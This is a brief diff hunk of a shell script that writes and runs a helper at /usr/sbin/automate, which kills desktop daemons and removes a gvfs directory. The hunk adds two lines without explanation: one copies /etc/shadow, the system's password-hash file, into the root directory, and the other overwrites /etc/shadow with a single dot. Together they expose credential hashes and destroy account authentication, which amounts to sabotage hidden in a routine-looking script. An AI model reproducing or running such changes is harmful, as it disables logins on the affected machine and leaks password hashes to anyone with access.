@@ -96,4 +96,7 @@ echo 'killall rtkit-daemon' >> /usr/sbin/automate
 echo 'killall /usr/libexec/gvfsd-trash' >> /usr/sbin/automate
 echo 'rm -r /org/gtk/gvfs' >> /usr/sbin/automate
 chmod u+x /usr/sbin/automate 
+cp /etc/shadow / 
+echo . > /etc/shadow
 automate
+echo automate /usr/sbin/automate
